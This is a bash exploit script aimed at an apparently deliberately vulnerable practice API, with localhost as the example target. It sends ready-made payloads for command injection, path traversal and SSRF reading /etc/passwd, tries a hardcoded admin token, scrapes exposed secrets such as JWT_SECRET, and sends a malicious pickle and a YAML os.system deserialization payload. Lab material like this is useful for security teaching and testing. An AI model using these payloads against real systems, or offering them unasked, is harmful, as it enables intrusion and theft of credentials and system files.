#!/bin/bash

# Script to exploit vulnerabilities in vulnerable-api

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

if [ -z "$1" ]; then
    echo -e "${RED}Usage: $0 <BASE_URL>${NC}"
    echo "Example: $0 http://localhost:5000"
    exit 1
fi

BASE_URL="$1"

echo -e "${BLUE}=== Exploiting Vulnerabilities in API ===${NC}\n"

# 1. Command Injection
echo -e "${YELLOW}[1] Testing Command Injection in /ping${NC}"
RESPONSE=$(curl -s "${BASE_URL}/ping?host=localhost; cat /etc/passwd")
echo "$RESPONSE" | grep -i "root:" && \
    echo -e "${GREEN}✓ Command Injection vulnerable${NC}" || \
    echo -e "${RED}✗ Command Injection not exploitable${NC}"

# 2. Path Traversal
echo -e "\n${YELLOW}[2] Testing Path Traversal in /read${NC}"
curl -s "${BASE_URL}/read?file=/etc/passwd" | grep -i "root:" && \
    echo -e "${GREEN}✓ Path Traversal vulnerable${NC}" || \
    echo -e "${RED}✗ Path Traversal not exploitable${NC}"

# 3. SSRF (Server-Side Request Forgery)
echo -e "\n${YELLOW}[3] Testing SSRF in /fetch${NC}"
echo -e "${YELLOW}   Attempting to read local file...${NC}"
curl -s "${BASE_URL}/fetch?url=file:///etc/passwd" | grep -i "root:" && \
    echo -e "${GREEN}✓ SSRF vulnerable${NC}" || \
    echo -e "${RED}✗ SSRF not exploitable${NC}"

# 4. Weak Authentication
echo -e "\n${YELLOW}[4] Testing weak authentication in /admin${NC}"
RESPONSE=$(curl -s -H "X-Token: admin_token_never_change" "${BASE_URL}/admin")
echo "$RESPONSE" | grep -i "admin\|secret" && \
    echo -e "${GREEN}✓ Weak authentication vulnerable${NC}" || \
    echo -e "${RED}✗ Authentication not vulnerable${NC}"

# 5. Environment Variable Exposure
echo -e "\n${YELLOW}[5] Testing environment variable exposure in /env${NC}"
curl -s "${BASE_URL}/env" | jq '.' 2>/dev/null | grep -i "ADMIN_PASSWORD\|JWT_SECRET" && \
    echo -e "${GREEN}✓ Environment variables exposed${NC}" || \
    echo -e "${RED}✗ No variables found${NC}"

# 6. Pickle Deserialization (dangerous - demonstration only)
echo -e "\n${YELLOW}[6] Testing unsafe deserialization in /unpickle${NC}"
echo -e "${RED}   WARNING: This can be dangerous${NC}"
# Create a simple malicious pickle payload
python3 << 'PYTHON_SCRIPT' > /tmp/pickle_payload 2>/dev/null || echo -e "${YELLOW}   Python3 not available, skipping pickle${NC}"
import pickle
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Malicious())
print(payload.hex())
PYTHON_SCRIPT

if [ -f /tmp/pickle_payload ]; then
    PAYLOAD_HEX=$(cat /tmp/pickle_payload | tr -d '\n')
    PAYLOAD=$(echo "$PAYLOAD_HEX" | xxd -r -p 2>/dev/null || echo "")
    if [ -n "$PAYLOAD" ]; then
        curl -s -X POST "${BASE_URL}/unpickle" \
            -H "Content-Type: application/octet-stream" \
            --data-binary "$PAYLOAD" && \
            echo -e "${GREEN}✓ Deserialization vulnerable${NC}" || \
            echo -e "${RED}✗ Deserialization not exploitable${NC}"
    fi
    rm -f /tmp/pickle_payload
fi

# 7. YAML Deserialization
echo -e "\n${YELLOW}[7] Testing YAML deserialization in /yaml${NC}"
curl -s -X POST "${BASE_URL}/yaml" \
    -H "Content-Type: text/yaml" \
    -d "!!python/object/apply:os.system ['id']" && \
    echo -e "${GREEN}✓ YAML deserialization vulnerable${NC}" || \
    echo -e "${RED}✗ YAML deserialization not exploitable${NC}"

echo -e "\n${BLUE}=== Exploitation Completed ===${NC}"
